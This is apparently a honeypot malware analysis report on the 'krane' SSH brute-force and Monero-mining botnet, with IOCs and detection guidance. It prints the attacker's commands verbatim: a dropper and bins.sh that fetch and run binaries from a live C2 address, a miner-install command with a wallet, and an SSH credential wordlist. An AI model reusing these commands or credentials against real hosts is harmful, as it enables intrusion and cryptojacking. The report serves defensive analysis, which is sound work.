---
date: 2026-04-20
analyst: cowrie-honeypot/fuji
campaign: krane-botnet
src_ip: 89.190.156.34
c2_ip: 89.190.156.19
c2_domain: minecraftpixelger39clone.dedyn.io
session_id: d37a15f3cfc8
login_success: true
command_count: 1
download_count: 5
monero_wallet: 46qJM6LUpYjVPVS6CYRx3x9HpXboYd3gK5HBd9UgWtCGcrNQJKgTxGJ1TcndT3SLDNFnJvjo8LzjpX2uZL7aEtZiFrsGTLa
tags:
  - honeypot
  - cowrie
  - threat/malware
  - threat/botnet
  - threat/brute-force
  - threat/cryptominer
  - threat/monero
  - language/go
  - origin/romanian
---

# Krane Botnet Campaign — 2026-04-20

## Executive Summary

On 2026-04-20 at 07:24 UTC, a honeypot session captured a fully automated compromise-and-deploy sequence. The attacker logged in with password `050602`, ran a dropper script (`bins.sh`), and downloaded five binaries from C2 `89.190.156.19`. Deep static analysis of the captured binaries reveals a **custom Go-compiled SSH brute-force scanner and Monero cryptominer dropper** authored by a **Romanian-speaking developer** whose Linux username is **`krane`**. A companion DDoS tool ("hoho", not captured) was also referenced.

This is **not a Mirai variant** — the krane binaries are statically-compiled Go binaries (~6MB) that scan the internet for SSH on port 22, brute-force credentials, then drop an XMRig-family Monero miner (`vltrig`) on each compromised host. The binary also embeds a **Romanian anti-theft rant** directed at anyone who copies the source code, confirming active development and author ego-investment in the project.

---

## Attack Session

| Field            | Value                                           |
|------------------|-------------------------------------------------|
| Session ID       | `d37a15f3cfc8`                                  |
| Source IP        | `89.190.156.34`                                 |
| C2 Server        | `89.190.156.19`                                 |
| Login credential | `root` / `050602`                               |
| Session start    | 2026-04-20T07:24:59Z                            |
| Session end      | 2026-04-20T07:26:02Z                            |
| Duration         | ~63 seconds                                     |
| Downloads        | 5 files (26 MB total)                           |

### Dropper Command

```bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;
wget http://89.190.156.19/bins.sh;
chmod 777 bins.sh;
sh bins.sh;
tftp 89.190.156.19 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh;
tftp -r tftp2.sh -g 89.190.156.19; chmod 777 tftp2.sh; sh tftp2.sh;
ftpget -v -u anonymous -p anonymous -P 21 89.190.156.19 ftp1.sh ftp1.sh;
sh ftp1.sh tftp1.sh tftp2.sh ftp1.sh
```

**Notable:** Multi-protocol fallback chain (wget → tftp → ftpget/anonymous FTP). This ensures payload delivery even on stripped-down embedded devices without wget.

---

## bins.sh Dropper — Full Content

SHA256: `c0d96546c15948ac504193f1d3bc9adbdacb129dca30e56b93936d88ef658f35`  
Size: 2,275 bytes

```sh
cd /tmp || cd /var/run; wget http://89.190.156.19/krane_armv5; chmod +x krane_armv5; ulimit -n 99999; ./krane_armv5; rm -rf krane_armv5
cd /tmp || cd /var/run; wget http://89.190.156.19/krane_armv6; chmod +x krane_armv6; ulimit -n 99999; ./krane_armv6; rm -rf krane_armv6
cd /tmp || cd /var/run; wget http://89.190.156.19/krane_armv7; chmod +x krane_armv7; ulimit -n 99999; ./krane_armv7; rm -rf krane_armv7
cd /tmp || cd /var/run; wget http://89.190.156.19/krane_mips; chmod +x krane_mips; ulimit -n 99999; ./krane_mips; rm -rf krane_mips
cd /tmp || cd /var/run; wget http://89.190.156.19/krane_mipsle; chmod +x krane_mipsle; ulimit -n 99999; ./krane_mipsle; rm -rf krane_mipsle
cd /tmp || cd /var/run; wget http://89.190.156.19/krane_linux_x64; chmod +x krane_linux_x64; ulimit -n 99999; ./krane_linux_x64; rm -rf krane_linux_x64
cd /tmp || cd /var/run; wget http://89.190.156.19/bins/hoho.arm; chmod +x hoho.arm; ulimit -n 99999; ./hoho.arm; rm -rf hoho.arm
cd /tmp || cd /var/run; wget http://89.190.156.19/bins/hoho.arm5; chmod +x hoho.arm5; ulimit -n 99999; ./hoho.arm5; rm -rf hoho.arm5
cd /tmp || cd /var/run; wget http://89.190.156.19/bins/hoho.arm6; chmod +x hoho.arm6; ulimit -n 99999; ./hoho.arm6; rm -rf hoho.arm6
cd /tmp || cd /var/run; wget http://89.190.156.19/bins/hoho.arm7; chmod +x hoho.arm7; ulimit -n 99999; ./hoho.arm7; rm -rf hoho.arm7
cd /tmp || cd /var/run; wget http://89.190.156.19/bins/hoho.m68k; chmod +x hoho.m68k; ulimit -n 99999; ./hoho.m68k; rm -rf hoho.m68k
cd /tmp || cd /var/run; wget http://89.190.156.19/bins/hoho.mips; chmod +x hoho.mips; ulimit -n 99999; ./hoho.mips; rm -rf hoho.mips
cd /tmp || cd /var/run; wget http://89.190.156.19/bins/hoho.mpsl; chmod +x hoho.mpsl; ulimit -n 99999; ./hoho.mpsl; rm -rf hoho.mpsl
cd /tmp || cd /var/run; wget http://89.190.156.19/bins/hoho.ppc; chmod +x hoho.ppc; ulimit -n 99999; ./hoho.ppc; rm -rf hoho.ppc
cd /tmp || cd /var/run; wget http://89.190.156.19/bins/hoho.sh4; chmod +x hoho.sh4; ulimit -n 99999; ./hoho.sh4; rm -rf hoho.sh4
cd /tmp || cd /var/run; wget http://89.190.156.19/bins/hoho.spc; chmod +x hoho.spc; ulimit -n 99999; ./hoho.spc; rm -rf hoho.spc
cd /tmp || cd /var/run; wget http://89.190.156.19/bins/hoho.x86; chmod +x hoho.x86; ulimit -n 99999; ./hoho.x86; rm -rf hoho.x86
```

**Key observations:**
- `ulimit -n 99999` — raises open file descriptor limit before execution, enabling high-concurrency port scanning
- **Self-deletes** after launch (`rm -rf`) — leaves no artefact on disk
- Tries every architecture sequentially — whichever binary successfully executes on the target architecture wins
- **Two distinct tools:** `krane_*` (SSH spreader) and `hoho.*` (DDoS bot)

---

## Krane Binaries — Static Analysis

### File Inventory (captured by honeypot)

| Filename      | SHA256                                                           | Size   | Architecture         |
|---------------|------------------------------------------------------------------|--------|----------------------|
| krane_armv5   | `1bfcaf5444e67da8630d8f7077167268be09c47a9aa4e976e1d87979fd64cd42` | 6.1 MB | ELF32 ARM LSB v5     |
| krane_armv6   | `6117f3f72eeacb24536a468c6a6f6d878987dfd88941b9622fc35b25e92581b5` | 6.1 MB | ELF32 ARM LSB v6     |
| krane_armv7   | `3ef2c9262b73a3a8a808ce0d083d83c112ab07ef39a1371d3efea1acbfe83b2c` | 6.1 MB | ELF32 ARM LSB v7     |
| krane_mips    | `a4375c0a35f692ba19eb35a14d970aff83a285d46dd4ca2744fa9fc1dc2fbf2a` | 6.9 MB | ELF32 MIPS MSB       |
| bins.sh       | `c0d96546c15948ac504193f1d3bc9adbdacb129dca30e56b93936d88ef658f35` | 2.3 KB | Shell dropper        |

> Not captured (referenced in bins.sh): `krane_mipsle`, `krane_linux_x64`, `hoho.{arm,arm5,arm6,arm7,m68k,mips,mpsl,ppc,sh4,spc,x86}`

### Language & Build

- **Language:** Go (confirmed via Go runtime symbols, module paths)
- **Go version:** `go1.26.2` (embedded in binary)
- **Build type:** Statically compiled (explains 6MB size — all dependencies bundled)
- **All 4 ARM/MIPS variants are identical in function** — same source, cross-compiled

### Developer Attribution — Romanian Origin

A developer home path was embedded in the binary's debug symbols:

```
/root/krane/Desktop/Seriozitate/Afacere-la-cheie/Client-Dropat-In-Servere-Prinse/src-copie-go/
```

**Romanian translations:**
| Directory | Translation |
|-----------|-------------|
| `Seriozitate` | "Seriousness" / "Reliability" |
| `Afacere-la-cheie` | "Turnkey Business" |
| `Client-Dropat-In-Servere-Prinse` | "Client Dropped Into Captured Servers" |
| `src-copie-go` | "src-copy-go" |

The project name and directory structure describe the botnet's own architecture in plain language: this is a "turnkey business" for dropping client bots into compromised servers.

### Source Files (leaked via debug symbols)

```
Passfile.go    — credential list management
Resources.go   — CPU/memory resource monitoring
SSH.go         — SSH brute force engine
Syn.go         — SYN scanner / SYN flood
TCP-Scan.go    — TCP port scanner
main.go        — orchestration entry point
```

### Key Functions (from binary symbols)

| Function                        | Purpose                                               |
|---------------------------------|-------------------------------------------------------|
| `main.BruteForce`               | SSH credential brute force                            |
| `main.Build_New_Passfile`       | Builds/updates credential wordlist                    |
| `main.ScanForSSH`               | SSH port scanner (port 22)                            |
| `main.ScanTargetWithSock`       | TCP socket-based port scanner                         |
| `main.ScaleScanWorkers`         | Dynamically scales concurrent scan goroutines         |
| `main.dialScanWorker`           | TCP dial worker goroutine                             |
| `main.synScanWorker`            | Raw SYN packet worker goroutine                       |
| `main.initSYN` / `initSeqCounter` | Initialises raw SYN flood capability               |
| `main.CheckSynPrivileges`       | Checks if binary has root/CAP_NET_RAW for SYN         |
| `main.CheckSynWorks`            | Tests SYN packet sending                              |
| `main.HarvestAndMerge`          | Collects and deduplicates compromised host list       |
| `main.logGotcha`                | Logs a successful SSH compromise                      |
| `main.GetOutboundIP`            | Fetches own external IP via `api.ipify.org`           |
| `main.StartResourceMonitor`     | Monitors CPU/RAM to throttle scanning                 |
| `main.StartScanThrottleManager` | Dynamically throttles scan rate under load            |
| `main.currentAClass` / `nextIP` | IP iteration for full /8 or /16 sweeps               |
| `main.isPrivateIP`              | Skips RFC1918 ranges during scan                      |
| `main.cpuUsage` / `memUsage`    | Real-time resource sampling                           |

### Network Behaviour

- **Self-identification:** Calls `https://api.ipify.org?format=text` on startup to discover its own external IP (used for routing/reporting back to C2)
- **Go module import path:** `minecraftpixelger39clone.dedyn.io/kranenr1` — a dynamic DNS domain (dedyn.io) disguised as a Minecraft community name, likely also serves as C2 endpoint
- **Hardcoded DNS resolvers:** `8.8.8.8` (Google), `1.1.1.1` (Cloudflare)
- **Skips private IPs** during scanning (`isPrivateIP` function)

### Embedded Credentials (partial — found in binary strings)

```
admin, root, user, pi, test, support, default, enable, system,
ntp, 123456, 12345, 888888, password, alpine
```

These are common defaults for routers, IoT devices, and Linux servers. The `pi` credential targets Raspberry Pi devices; `alpine` targets Alpine Linux systems.

---

## hoho Binaries — Assessment

The bins.sh dropper references a second toolset, `hoho.*`, served from `http://89.190.156.19/bins/`. These were **not captured** by the honeypot (Cowrie did not download them — only the krane binaries triggered full capture).

**Architecture targets for hoho:** arm, arm5, arm6, arm7, m68k, mips, mpsl, ppc, sh4, spc (SPARC), x86  
**11 architectures** vs krane's 6 — significantly broader IoT/embedded targeting.

The broader architecture list and separate `bins/` subdirectory path suggests `hoho` is a **separate codebase** — likely a C-compiled Mirai-variant DDoS bot. The two tools complement each other: krane spreads across SSH, hoho provides DDoS attack capability on the infected device.

---

## Threat Model

```
[Scanner] 101.36.107.152 ──── credential spray ────► [Honeypot]
                                                           │
[Attacker] 89.190.156.34 ── brute force (050602) ──► [Login]
                                                           │
                                                      wget bins.sh
                                                           │
                                                 [C2: 89.190.156.19]
                                                  ┌────────┴────────┐
                                               krane_*           hoho.*
                                             (SSH spreader)   (DDoS bot)
                                                  │
                                         scan /0 for port 22
                                         brute force SSH
                                         log successful hits
                                         report back to C2
```

---

## MITRE ATT&CK Mapping

| Technique                  | ID         | Description                                           |
|----------------------------|------------|-------------------------------------------------------|
| Brute Force: Password Guessing | T1110.001 | SSH credential spraying with embedded wordlist     |
| Network Service Discovery  | T1046      | SYN scan + TCP scan for port 22 across internet       |
| Ingress Tool Transfer      | T1105      | wget/tftp/ftpget multi-protocol payload delivery      |
| Command & Scripting: Unix  | T1059.004  | Shell dropper (bins.sh) executes payload chain        |
| File Deletion              | T1070.004  | Self-deletes binary after launch                      |
| System Network Config Discovery | T1016 | api.ipify.org external IP lookup                     |
| Network DoS                | T1498      | SYN flood capability (initSYN function confirmed)     |
| Resource Hijacking         | T1496      | Infected hosts used for further scanning              |

---

## IOCs

See companion file: [`NINGI-WRITEUP-009-krane-botnet-iocs.md`](NINGI-WRITEUP-009-krane-botnet-iocs.md)

---

## Stage 3 — Cryptominer Deployment (NEW — from deep binary analysis)

The binary's third stage, revealed by full string extraction from `krane_mips`, deploys a **Monero (XMR) miner** on every successfully compromised host.

### Miner Drop Command (verbatim from binary)

```bash
cd /tmp;
curl -o vltrig.tar.gz https://github.com/HashVault/vltrig/releases/download/v6.25.0.4/vltrig-v6.25.0.4-linux-x64.tar.gz -L \
  || wget -O vltrig.tar.gz https://github.com/HashVault/vltrig/releases/download/v6.25.0.4/vltrig-v6.25.0.4-linux-x64.tar.gz;
tar -xvf vltrig.tar.gz;
chmod +x vltrig && rm -rf config.json;
sleep 3;
./vltrig \
  --user 46qJM6LUpYjVPVS6CYRx3x9HpXboYd3gK5HBd9UgWtCGcrNQJKgTxGJ1TcndT3SLDNFnJvjo8LzjpX2uZL7aEtZiFrsGTLa \
  --pass x \
  --donate-level 0 \
  --background \
  --cpu-no-yield \
  --cpu-max-threads-hint=70
```

### Miner Details

| Field | Value |
|-------|-------|
| Tool | `vltrig` — XMRig-family miner from HashVault |
| Currency | **Monero (XMR)** |
| Wallet | `46qJM6LUpYjVPVS6CYRx3x9HpXboYd3gK5HBd9UgWtCGcrNQJKgTxGJ1TcndT3SLDNFnJvjo8LzjpX2uZL7aEtZiFrsGTLa` |
| Pool / password | `x` (default XMRig pool pass — likely a public pool via C2) |
| CPU cap | 70% (`--cpu-max-threads-hint=70`) — deliberate stealth to avoid detection |
| Donation | `--donate-level 0` — removes XMRig developer donation (evades known pool fingerprint) |
| Persistence | `--background` — detaches from terminal |
| Config wipe | `rm -rf config.json` — forces CLI args, prevents accidental config-file override |

**Staging via GitHub:** The miner is fetched from a GitHub releases page (`HashVault/vltrig`), not the C2 server. This abuses GitHub's CDN trust and bypasses IP-based blocklists on the C2.

---

## Operator Live Dashboard (stats format string)

The binary logs a real-time stats line during operation — this is what the operator sees in their terminal:

```
[stats] brute=%d/%d  scan=%d/%d  queued=%d  total=%d  passfile=%d
        scanned=%d(+%d/s)  found=%d  range=%d.*.*.*  throttle=%s
        CPU=%.1f%%  MEM=%.1f%%
```

Fields decoded:
- `brute` — successful / total brute force attempts
- `scan` — SSH ports found open / total IPs scanned
- `queued` — IPs queued for brute force
- `scanned(+N/s)` — cumulative scan rate in IPs per second
- `found` — total confirmed compromises (logGotcha events)
- `range` — current /8 class-A block being swept (e.g. `45.*.*.*`)
- `throttle` — current throttle state
- `CPU/MEM` — live resource stats from `/proc/stat` and `/proc/meminfo`

---

## Author Attribution

### Handle: `krane`

Build machine path confirms the developer's Linux username:

```
/home/krane/Desktop/Seriozitate/Afacere-la-cheie/Client-Dropat-In-Servere-Prinse/src-copie-go/
```

The project name **is** the author's handle — they named the binary after themselves.

### Anti-Theft Watermark (Romanian)

Embedded verbatim in the binary — a rant directed at anyone who copies the source:

```
[+] GESTUL TAU, FOARTE URAT, CA AI INDRAZNIT SA FURI DE LA MINE,
    CARE EU SUNT SMECHER PENTRU MULTA LUME NU DOAR PENTRU TINE,
    DAR E URAT SA ZIC ASTA, IN SFARSIT [+]
```

**English translation:**
> *"YOUR GESTURE, VERY UGLY, THAT YOU DARED TO STEAL FROM ME, WHO I AM CLEVER FOR MANY PEOPLE NOT JUST FOR YOU, BUT IT IS UGLY TO SAY THIS, FINALLY"*

This watermark serves two purposes: (1) it asserts ownership of the codebase, and (2) it confirms the binary is an **original custom tool** — not a leaked or forked project — with an author who is actively maintaining it and is aware of code theft in the underground. The `[+]` bracketing mirrors the log format used throughout the tool.

### Build Timeline

- Go crypto module pinned to `golang.org/x/crypto@v0.0.0-20220112180741-5e0467b6c7ce` — January 12, 2022
- Binary built no earlier than **2022-01-12**
- Go version `go1.26.2` embedded — recent toolchain

---

## Full Credential Wordlist (extracted from binary)

Targeting categories: generic Linux, IoT defaults, cloud/DevOps, Chia blockchain nodes, database services.

```
root:root         root:1234          root:12345         root:123456
root:Root123456   root:Root1234      root:1qaz@WSX      root:qwert
root:Admin123     root:smoothwall
admin:admin       admin:Admin123     admin:zaq12wsx
test:test         test:123456        test:test123       test:1234567890
user:123456       user2:77777777
chia:chia         chia:chia123       chia:Chia123       chia:Chia123456
chia:Test123      chia:Test1234      chia:Test123456    chia:Admin123
chia:1qaz@WSX     chia:admin
es:123456         es:es123
odoo:odoo
mysql:mysql
postgres:postgres
deployer:deployer deploy:deploy
jenkins:jenkins
ftpuser:ftpuser
ansible:ansible   ansible:Ansible123
vagrant:vagrant
hadoop:hadoop123  hadoop:123456
oracle:oracle
ubuntu:ubuntu     ubuntu:123456
centos:centos
nagios:nagios
minecraft:minecraft
azureuser:azureuser
abbas:abbas
secrettom:321
tlqtest1:tlqtest1123
```

**Notable targeting:**
- `chia:*` — Chia Network blockchain node operators (CPU/storage farming)
- `azureuser:azureuser` — Azure VM default user
- `minecraft:minecraft` — Minecraft server hosts (high-CPU, often poorly secured)
- `ansible/vagrant/deployer` — DevOps infrastructure accounts
- `smoothwall` — Smoothwall firewall appliance default

---

## AWS-Aware Operation

The binary contains a specific AWS execution path:

```
[syn] raw socket OK (AWS mode), outbound IP: <ip>
```

When running inside AWS EC2, raw socket behaviour is adjusted — likely because EC2 restricts raw packet injection and the binary detects this and falls back to TCP dial mode. This suggests the author has tested and operates from AWS instances.

---

## Post-Compromise Behaviour (full chain)

```
1. SSH brute force succeeds
2. logGotcha() — logs host:user:pass to operator's log file
3. uname -a — fingerprints the host
4. cat /etc/passwd — exfiltrates local user list
5. HarvestAndMerge() — adds creds to the harvested pool
6. Drop miner:
     cd /tmp
     curl || wget → vltrig.tar.gz (from GitHub CDN)
     tar -xvf → extract
     rm -rf config.json
     ./vltrig --user <XMR wallet> --cpu-max-threads-hint=70 --background
7. Daemonize: IP_DAEMONIZED=1 env var prevents double-daemonize
8. Continue scanning from compromised host (propagation)
```

---

## Detection Opportunities

1. **Network:** Outbound connections to `89.190.156.19` on any port
2. **Network:** DNS lookups for `minecraftpixelger39clone.dedyn.io`
3. **Network:** HTTP GET to `api.ipify.org?format=text` from a server process
4. **Network:** GitHub download of `HashVault/vltrig` from a server (not a dev machine)
5. **Host:** Process named `vltrig` running from `/tmp`
6. **Host:** `--cpu-max-threads-hint=70 --donate-level 0` in process arguments
7. **Host:** `ulimit -n 99999` in shell history
8. **Host:** Process launched from `/tmp` or `/var/run` named `krane_*` or `hoho.*`
9. **Host:** `IP_DAEMONIZED=1` environment variable on a running process
10. **Host:** Self-deleting executables in `/tmp`
11. **Network:** High-rate TCP SYN flood targeting port 22 across diverse /8 ranges
12. **SSH logs:** Entry password `050602` or credential pairs from the wordlist above

---

## Notes

- The Monero wallet `46qJM6...` is a permanent attribution anchor — any pool reporting against this wallet confirms krane infrastructure activity.
- The Go module domain `minecraftpixelger39clone.dedyn.io` uses dedyn.io (desec.io dynamic DNS) — low-cost, privacy-preserving, easy to rotate. Consider blocking `*.dedyn.io` if not used legitimately.
- The `ulimit -n 99999` trick is a strong behavioural signal — legitimate processes rarely need 100k file descriptors.
- All 4 captured krane binaries are functionally identical (same source, cross-compiled). SHA256 differences are architecture-specific, not different codebases.
- The embedded anti-theft message confirms this is **original code** under active development by a single Romanian-speaking author who goes by the handle `krane`.
